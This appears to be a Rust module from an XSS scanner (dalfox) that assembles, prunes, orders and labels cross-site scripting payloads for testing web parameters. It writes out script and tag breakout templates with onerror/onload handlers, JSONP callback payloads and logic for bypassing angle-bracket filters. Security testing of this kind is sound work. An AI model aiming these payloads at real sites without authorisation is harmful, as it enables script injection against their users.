//! payload catalog, pruning, family interleave, DOM payloads, inject-type labels.
//!
//! Extracted from the scanning hub; see `mod.rs` for the pipeline overview.

use super::*;

/// Label written to `Result.inject_type` for findings produced by the scan
/// loop. Findings under `--sxss` are prefixed so JSON / markdown / plain
/// reports distinguish stored from reflected results — downstream tooling
/// parses this field, so the contract is pinned by `tests::test_inject_type_label_for_sxss`.
pub(crate) fn inject_type_label_for(sxss: bool) -> &'static str {
    if sxss { "sxss-inHTML" } else { "inHTML" }
}
/// True when the payload that produced the finding looks like a
/// client-side template interpolation. `{{` / `}}` is sufficient on its
/// own — Mustache, Handlebars, AngularJS, Vue and Ember all share that
/// delimiter. Used to refine `inject_type` to `*-CSTI` so plain / JSON
/// output makes the framework-injection finding distinguishable from a
/// generic HTML reflection.
pub(crate) fn is_template_shaped_payload(payload: &str) -> bool {
    payload.contains("{{") && payload.contains("}}")
}
/// Map a framework innerHTML-sink directive name (recorded on
/// `Param.framework_sink` during discovery) to the short suffix used in
/// `inject_type`. Anything unrecognised falls back to a generic
/// `-FrameworkSink` so the user still sees the class of finding even if
/// dalfox grows support for a new directive name later.
pub(crate) fn framework_sink_suffix(sink: &str) -> &'static str {
    match sink {
        "v-html" => "-VHtml",
        "data-bind" => "-DataBind",
        "ng-bind-html" => "-NgBindHtml",
        "dangerouslySetInnerHTML" => "-DangerouslySetInnerHTML",
        _ => "-FrameworkSink",
    }
}
/// Refine the base `inject_type` label. Order of precedence:
///   1. `-VHtml` / `-DataBind` / `-NgBindHtml` from a discovered
///      framework innerHTML sink (highest signal — entity-encoded
///      reflections in these attributes still execute).
///   2. `-CSTI` for client-side template payloads (`{{ … }}`).
///   3. base label only.
///
/// Mirrors the SXSS prefixing convention (`sxss-inHTML-VHtml`) so
/// downstream parsers don't have to special-case ordering.
#[cfg(test)]
pub(crate) fn inject_type_for_payload(sxss: bool, payload: &str) -> String {
    inject_type_for_payload_with_sink(sxss, payload, None)
}
pub(crate) fn inject_type_for_payload_with_sink(
    sxss: bool,
    payload: &str,
    framework_sink: Option<&str>,
) -> String {
    let base = inject_type_label_for(sxss);
    if let Some(sink) = framework_sink {
        return format!("{}{}", base, framework_sink_suffix(sink));
    }
    if is_template_shaped_payload(payload) {
        format!("{}-CSTI", base)
    } else {
        base.to_string()
    }
}
pub(crate) fn reflection_kind_note(
    kind: crate::scanning::check_reflection::ReflectionKind,
) -> &'static str {
    match kind {
        crate::scanning::check_reflection::ReflectionKind::Raw => "reflected",
        crate::scanning::check_reflection::ReflectionKind::HtmlEntityDecoded => {
            "reflected after HTML-entity decoding"
        }
        crate::scanning::check_reflection::ReflectionKind::UrlDecoded => {
            "reflected after URL/form decoding"
        }
        crate::scanning::check_reflection::ReflectionKind::HtmlThenUrlDecoded => {
            "reflected after HTML-entity and URL/form decoding"
        }
    }
}
/// Drop payloads whose raw bytes carry an HTML-structural character the
/// server has been observed to filter (recorded in
/// `Param.invalid_specials` by Stage 3 active probing). Raw `<`/`>` cannot
/// pass through a server-side blocklist that strips those bytes after
/// decoding, so the corresponding payload has no chance to reflect — every
/// HTTP request spent on it is wasted. The encoded variants of the same
/// payload (`%3Csvg%3E`, `&lt;svg&gt;`, multi-URL-encoded forms) carry no
/// raw `<`/`>` themselves and survive this pass, preserving the bypass
/// surface for naive filters that decode only once.
///
/// Conservative on quotes: attribute-breakout payloads intentionally lead
/// with the same delimiter character the surrounding HTML attribute uses,
/// and that delimiter must already be a "valid" special (the server
/// emitted it), so pruning on `"`/`'` would mistakenly drop the very
/// payloads that exploit attribute injection.
pub(crate) fn prune_blocked_raw_angles(
    payloads: Vec<String>,
    invalid_specials: &[char],
) -> Vec<String> {
    let block_lt = invalid_specials.contains(&'<');
    let block_gt = invalid_specials.contains(&'>');
    if !block_lt && !block_gt {
        return payloads;
    }
    payloads
        .into_iter()
        .filter(|p| {
            // Leading-window ("positional") filter bypass payloads carry raw
            // `<`/`>` on purpose: their premise is that the block is positional,
            // so the raw angle passes once the leading pad pushes it past the
            // filtered window. Keep them despite the blocked-angle classification
            // (they are FP-safe — a non-positional filter still encodes the `<`
            // and nothing verifies). See `synthesis::positional_pad_payloads`.
            // Doubled-angle ("sub-not-gsub") bypasses carry raw `<`/`>` for the
            // same reason — the second angle opens a tag once a one-shot filter
            // has consumed the first. See `synthesis::sub_filter_doubled_payloads`.
            crate::payload::synthesis::is_positional_pad_bypass(p)
                || crate::payload::synthesis::is_sub_filter_doubled_bypass(p)
                || !((block_lt && p.contains('<')) || (block_gt && p.contains('>')))
        })
        .collect()
}
/// Common encoded forms of `<` / `>` we look for when deciding whether a
/// payload depends on angle brackets. A payload that carries any of these
/// forms is hoping the server single-pass-decodes the input — when the
/// server filters `<` after decode (the common case), the bypass fails.
/// Hoisting payloads that carry no angle bracket in any form (event-
/// handler quote-breakouts, protocol-URI payloads) ahead of these
/// angle-dependent variants lets the scanner hit a working payload first
/// and short-circuit the rest of the loop via `reflection_found_locally`.
pub(crate) const ANGLE_ENCODED_NEEDLES_LT: &[&str] = &[
    "%3C", "%3c", "%253C", "%253c", "&lt;", "&LT;", "&#60;", "&#x3c;", "&#x3C;", "&#x003c;",
    "&#x003C;",
];
pub(crate) const ANGLE_ENCODED_NEEDLES_GT: &[&str] = &[
    "%3E", "%3e", "%253E", "%253e", "&gt;", "&GT;", "&#62;", "&#x3e;", "&#x3E;", "&#x003e;",
    "&#x003E;",
];
/// True when the payload carries no `<` or `>` in any of: raw bytes,
/// percent-encoded form (single or double), or HTML entity (named,
/// decimal, hex). Used to hoist angle-free payloads to the front of the
/// payload list when `Param.invalid_specials` flags angle brackets — those
/// payloads (event-handler quote-breakouts, `javascript:` protocol URIs)
/// are the ones that actually reflect through an angle-stripping filter,
/// and the loop's `reflection_found_locally` short-circuit means the
/// first hit zeros out the rest of the budget.
pub(crate) fn payload_is_angle_free(p: &str) -> bool {
    if p.contains('<') || p.contains('>') {
        return false;
    }
    for n in ANGLE_ENCODED_NEEDLES_LT {
        if p.contains(n) {
            return false;
        }
    }
    for n in ANGLE_ENCODED_NEEDLES_GT {
        if p.contains(n) {
            return false;
        }
    }
    true
}
/// Stable-partition the payload list so payloads that don't depend on
/// `<`/`>` (in any encoded form) come first when active probing has
/// flagged angles as invalid. Pairs with [`prune_blocked_raw_angles`]:
/// pruning kills raw-angle payloads outright, hoisting reorders the
/// remaining list so the angle-free survivors get tested before the
/// encoded-angle variants whose only hope is a naive single-pass-decode
/// filter (rare in practice). Net effect: the first reflection-finding
/// request usually comes from an angle-free payload, the loop short-
/// circuits, and the budget for the param collapses from thousands of
/// requests to dozens.
pub(crate) fn hoist_angle_free_payloads(
    payloads: Vec<String>,
    invalid_specials: &[char],
) -> Vec<String> {
    let block_lt = invalid_specials.contains(&'<');
    let block_gt = invalid_specials.contains(&'>');
    if !block_lt && !block_gt {
        return payloads;
    }
    // Three tiers, front to back:
    //   pad   — leading-window ("positional") and doubled-angle ("sub-not-gsub")
    //           bypass payloads (raw `<` on purpose). When angles are reported
    //           blocked the block may be positional or one-shot, and these are
    //           then the *only* shapes that can reach a tag injection, so they
    //           must lead — otherwise the DOM phase's inert-echo early exit can
    //           retire before they are ever tried.
    //   clean — angle-free survivors (event-handler / quote-breakout shapes).
    //   rest  — encoded-angle variants (need a naive single-pass-decode filter).
    let mut pad: Vec<String> = Vec::new();
    let mut clean: Vec<String> = Vec::with_capacity(payloads.len());
    let mut rest: Vec<String> = Vec::with_capacity(payloads.len());
    for p in payloads {
        if crate::payload::synthesis::is_positional_pad_bypass(&p)
            || crate::payload::synthesis::is_sub_filter_doubled_bypass(&p)
        {
            pad.push(p);
        } else if payload_is_angle_free(&p) {
            clean.push(p);
        } else {
            rest.push(p);
        }
    }
    pad.reserve(clean.len() + rest.len());
    pad.extend(clean);
    pad.extend(rest);
    pad
}
pub(crate) fn get_fallback_reflection_payloads(
    args: &ScanArgs,
) -> Result<Vec<String>, Box<dyn std::error::Error>> {
    let mut base_payloads = vec![];

    if args.only_custom_payload {
        if let Some(path) = &args.custom_payload {
            base_payloads.extend(crate::scanning::xss_common::load_custom_payloads(path)?);
        }
    } else {
        // Round-robin interleave the reflection families so any prefix of the
        // list samples *every* family proportionally — the same #1156 diversity
        // guarantee the DOM catalog gets (see `get_dom_payloads_for_context`'s
        // None arm). The reflection phase's transformed-inert-echo budget and
        // the per-parameter safety cap both sample a *prefix* of this list, and
        // plain concatenation appended the protocol family thousands of payloads
        // in, so on a uniformly-escaping URL-attribute echo the budget could
        // retire before a single `javascript:` protocol payload — the only
        // reflection-phase verifier for that sink — was ever tried.
        //
        // JS-only payloads (`alert(1)` etc.) are still excluded from the
        // reflection set: reflected inside a quoted attribute value they cause
        // false-positive R findings that block the attribute-breakout payloads.
        // Within-family order is preserved (HTML tag-breakouts first inside the
        // HTML family, event-handler order inside the attribute family, …), so
        // the encoder pass and downstream dedup see the same members as before —
        // only their interleaving changes.
        base_payloads = interleave_payload_families(vec![
            crate::payload::get_dynamic_xss_html_payloads(),
            crate::payload::get_dynamic_xss_attribute_payloads(),
            crate::payload::get_mxss_payloads(),
            crate::payload::get_protocol_injection_payloads(),
        ]);
        // Custom payloads keep their appended position (after the built-in
        // families), matching the pre-interleave order and the custom-only arm.
        if let Some(path) = &args.custom_payload {
            base_payloads.extend(crate::scanning::xss_common::load_custom_payloads(path)?);
        }
    }

    // Apply encoder policy to unique base payloads
    let payloads = crate::encoding::apply_encoders_to_payloads(&base_payloads, &args.encoders);

    Ok(payloads)
}
pub(crate) fn get_js_breakout_payloads() -> Vec<String> {
    let class_marker = crate::scanning::markers::class_marker();
    let id_marker = crate::scanning::markers::id_marker();

    let base_templates = [
        format!("</script><img src=x onerror={{JS}} class={}>", class_marker),
        format!("</script><svg onload={{JS}} class={}>", class_marker),
        format!("</script><img src=x onerror={{JS}} id={}>", id_marker),
    ];

    let breakout_prefixes: &[&str] = &["", "';", "\";", "*/"];

    let mut payloads = Vec::new();
    for js in crate::payload::XSS_JAVASCRIPT_PAYLOADS_SMALL.iter() {
        for tmpl in &base_templates {
            for &prefix in breakout_prefixes {
                let payload = format!("{}{}", prefix, tmpl.replace("{JS}", js));
                payloads.push(payload);
            }
        }
    }
    payloads
}
/// Number of joiner forms [`get_js_expression_breakout_payloads`] emits per
/// primitive for a quote delimiter.
const JS_EXPRESSION_JOINERS: usize = 5;
/// String-literal breakouts for a JS reflection whose quote delimiter is
/// known. Empty when it is not: the unquoted forms are already covered by
/// [`get_jsonp_callback_payloads`].
///
/// Several joiners, because a filter that strips one (`-`) leaves the others:
/// arithmetic (`'-X-'`, `'+X+'`, `'*X*'`), closing the call and commenting out
/// the rest (`');X//`), and the object-key position (`go({'Q':1})` →
/// `':X,'`). Primitive-major order puts every joiner's `alert(1)` first.
pub(crate) fn get_js_expression_breakout_payloads(
    delim: Option<&crate::parameter_analysis::DelimiterType>,
) -> Vec<String> {
    use crate::parameter_analysis::DelimiterType;
    let q = match delim {
        Some(DelimiterType::SingleQuote) => '\'',
        Some(DelimiterType::DoubleQuote) => '"',
        Some(DelimiterType::Backtick) => {
            return crate::payload::XSS_JAVASCRIPT_PAYLOADS_SMALL
                .iter()
                .map(|js| format!("${{{js}}}"))
                .collect();
        }
        _ => return Vec::new(),
    };
    let mut out = Vec::new();
    for js in crate::payload::XSS_JAVASCRIPT_PAYLOADS_SMALL {
        out.push(format!("{q}-{js}-{q}"));
        out.push(format!("{q}+{js}+{q}"));
        out.push(format!("{q}*{js}*{q}"));
        out.push(format!("{q});{js}//"));
        out.push(format!("{q}:{js},{q}"));
    }
    out
}
/// True when discovery saw the JS string's delimiter quote reflected only
/// JS-escaped (`'` → `\'`, `Param::escaped_specials`). A raw-quote string
/// breakout can never close that string, so a `</script>` tag breakout is the
/// likely exploit and the string breakouts should run after it.
///
/// `invalid_specials` is deliberately not consulted: it is measured on the
/// entity-decoded reflection, and a quote that comes back as `&#39;` is dead in
/// a `<script>` block but live again in an `on*` handler, where the browser
/// decodes it before the JS runs.
fn js_string_needs_tag_breakout(
    param: &Param,
    delim: Option<&crate::parameter_analysis::DelimiterType>,
) -> bool {
    use crate::parameter_analysis::DelimiterType;
    let quote = match delim {
        Some(DelimiterType::SingleQuote) => '\'',
        Some(DelimiterType::DoubleQuote) => '"',
        _ => return false,
    };
    param
        .escaped_specials
        .as_deref()
        .is_some_and(|e| e.contains(&quote))
}
/// JSONP-callback payloads: reflected as the *callable identifier* of a
/// `application/javascript` (JSONP) response — `callback=…` echoed into
/// `…({"data":1})`. Each is executable JavaScript that calls a visible sink and
/// comments-out / neutralises the trailing `({…})`, so `has_js_context_evidence`
/// confirms a real `CallExpression` covered by the payload (the genuine JSONP
/// XSS the `content_type_is_inert_data` carve-out keeps `application/javascript`
/// scannable for). On an HTML body these parse-fail as whole-document
/// JavaScript, so they add no false positives — only the DOM phase's
/// content-type-aware JS-context check upgrades them to V.
pub(crate) fn get_jsonp_callback_payloads() -> Vec<String> {
    vec![
        "alert(document.domain)//".to_string(),
        ";alert(1)//".to_string(),
        "-alert(1)-".to_string(),
    ]
}
/// Round-robin interleave several payload families into one list so that any
/// prefix samples *every* family proportionally (issue #1156). Used for the
/// unknown-context DOM catalog so the recall-preserving DOM-phase early exit
/// sees a representative of each DOM-evidence kind before the inert-echo budget
/// can trip, instead of exhausting the (redundant, sink-varied) HTML-template
/// block while the protocol/mXSS families sit thousands of payloads away.
/// Within-family order is preserved; the result contains exactly the union of
/// the inputs (no dedup — the encoder pass dedups downstream).
pub(crate) fn interleave_payload_families(families: Vec<Vec<String>>) -> Vec<String> {
    let total: usize = families.iter().map(Vec::len).sum();
    // Consume each family (move the Strings out — the generators already handed
    // us owned clones) rather than re-cloning per element.
    let mut iters: Vec<_> = families.into_iter().map(Vec::into_iter).collect();
    let mut out = Vec::with_capacity(total);
    let mut any = true;
    while any {
        any = false;
        for it in &mut iters {
            if let Some(p) = it.next() {
                out.push(p);
                any = true;
            }
        }
    }
    out
}
/// Resolve the effective per-parameter payload cap from the user's
/// `--max-payloads-per-param` (`max_payloads`) and `--deep-scan` flags.
///
/// - An explicit `--max-payloads-per-param N` (N > 0) always wins — it is
///   honored verbatim even under `--deep-scan`.
/// - `0` (the default) means "apply the built-in [`DEFAULT_PAYLOAD_SAFETY_CAP`]"
///   so a parameter that reflects every payload without DOM-verifying can't
///   drive the DOM phase through the full payload set (issue #1153).
/// - `--deep-scan` lifts only the built-in safety cap: it makes the default
///   (`0`) unlimited for exhaustive runs. It does not override an explicit cap.
pub(crate) fn effective_payload_cap(max_payloads: usize, deep_scan: bool) -> usize {
    match max_payloads {
        0 if deep_scan => 0,
        0 => crate::cmd::scan::DEFAULT_PAYLOAD_SAFETY_CAP,
        n => n,
    }
}
pub(crate) fn get_dom_payloads(
    param: &Param,
    args: &ScanArgs,
) -> Result<Vec<String>, Box<dyn std::error::Error>> {
    let mut payloads = get_dom_payloads_for_context(param, args)?;

    // Prepend JSONP-callback verifiers (raw, un-encoded) so a
    // `application/javascript` endpoint that reflects the callable identifier is
    // DOM-verified via JS-context evidence — the genuine JSONP XSS — instead of
    // the false-positive HTML-marker echo the content-type gate now suppresses.
    // Placed first so they land inside the DOM phase's inert-echo early-exit
    // window; on an HTML body they parse-fail as whole-document JS and add no
    // findings. Skipped only when the user restricts to custom payloads.
    if !args.only_custom_payload {
        let jsonp = get_jsonp_callback_payloads();
        if !jsonp.is_empty() {
            payloads.splice(0..0, jsonp);
        }
    }
    Ok(payloads)
}
pub(crate) fn get_dom_payloads_for_context(
    param: &Param,
    args: &ScanArgs,
) -> Result<Vec<String>, Box<dyn std::error::Error>> {
    match &param.injection_context {
        // JS context: script breakout payloads with markers for DOM verification
        Some(crate::parameter_analysis::InjectionContext::Javascript(delim)) => {
            // String-literal breakouts: the `</script>` tag breakouts are inert
            // when the reflection sits in an `on*` handler (no `<script>` to
            // close), where ending the string is the only way to reach the
            // sink. Sent raw only: they verify through the AST checks, which
            // look for the as-sent payload, so encoded variants are wasted
            // requests.
            let mut expression = get_js_expression_breakout_payloads(delim.as_ref());
            let tags = crate::encoding::apply_encoders_to_payloads(
                &get_js_breakout_payloads(),
                &args.encoders,
            );
            // Only the first primitive's form of each joiner leads (that is
            // what verifies a handler breakout); the primitive variants follow
            // the tag breakouts, so a `</script>`-exploitable string pays a
            // handful of extra requests, not the whole family. When discovery
            // saw the quote JS-escaped, no raw-quote breakout can work, so the
            // tag breakouts go first outright.
            let tail = expression.split_off(expression.len().min(JS_EXPRESSION_JOINERS));
            let out: Vec<String> = if js_string_needs_tag_breakout(param, delim.as_ref()) {
                tags.into_iter().chain(expression).chain(tail).collect()
            } else {
                expression.into_iter().chain(tags).chain(tail).collect()
            };
            Ok(out)
        }
        // Known non-JS contexts: use locally generated payloads only (exclude remote) to avoid large cross-product
        Some(ctx) => {
            // If param has analysis data, use adaptive encoding for better bypass
            if param.invalid_specials.is_some() || param.valid_specials.is_some() {
                let invalid = param.invalid_specials.as_deref().unwrap_or_default();
                let valid = param.valid_specials.as_deref().unwrap_or_default();
                let payloads =
                    crate::scanning::xss_common::generate_adaptive_payloads(ctx, invalid, valid);
                return Ok(payloads);
            }
            // Use locally generated payloads only (no remote) to avoid large cross-product in DOM verification
            let base_payloads = crate::scanning::xss_common::generate_dynamic_payloads(ctx);
            // Expand with shared encoder policy helper
            let out = crate::encoding::apply_encoders_to_payloads(&base_payloads, &args.encoders);
            Ok(out)
        }
        // Unknown context: use HTML + Attribute payloads (+ custom if provided), never error
        None => {
            // Use only local HTML/Attribute payloads (exclude remote) for DOM verification in unknown contexts
            let mut base_payloads = vec![];

            if args.only_custom_payload {
                if let Some(path) = &args.custom_payload {
                    // Avoid erroring when custom payload file is missing
                    base_payloads.extend(
                        crate::scanning::xss_common::load_custom_payloads(path)
                            .unwrap_or_else(|_| vec![]),
                    );
                }
            } else {
                // Issue #1156: round-robin interleave the evidence families so
                // every DOM-evidence kind (HTML-tag, event-handler/attribute,
                // mXSS, DOM-clobbering, protocol/URL) is represented in any
                // prefix of the list — in particular within the first
                // `INERT_ECHO_BUDGET` payloads the DOM-phase early exit samples.
                // Plain concatenation appended the protocol/mXSS generators last
                // (thousands of payloads in), so the early exit could cut them
                // entirely on a raw-reflecting URL-attribute echo, where the
                // protocol payload is the only verifier. Within-family ordering
                // (e.g. HTML attribute-breakout templates first) is preserved.
                base_payloads = interleave_payload_families(vec![
                    crate::payload::get_dynamic_xss_html_payloads(),
                    crate::payload::get_dynamic_xss_attribute_payloads(),
                    crate::payload::get_mxss_payloads(),
                    crate::payload::get_dom_clobbering_payloads(),
                    crate::payload::get_protocol_injection_payloads(),
                ]);
                if let Some(path) = &args.custom_payload {
                    base_payloads.extend(
                        crate::scanning::xss_common::load_custom_payloads(path)
                            .unwrap_or_else(|_| vec![]),
                    );
                }
            }

            // Ensure we always have DOM-capable payloads for non-JS contexts
            if base_payloads.is_empty() {
                base_payloads.extend(crate::payload::get_dynamic_xss_html_payloads());
                base_payloads.extend(crate::payload::get_dynamic_xss_attribute_payloads());
            }

            // Expand with shared encoder policy helper
            let out = crate::encoding::apply_encoders_to_payloads(&base_payloads, &args.encoders);
            Ok(out)
        }
    }
}
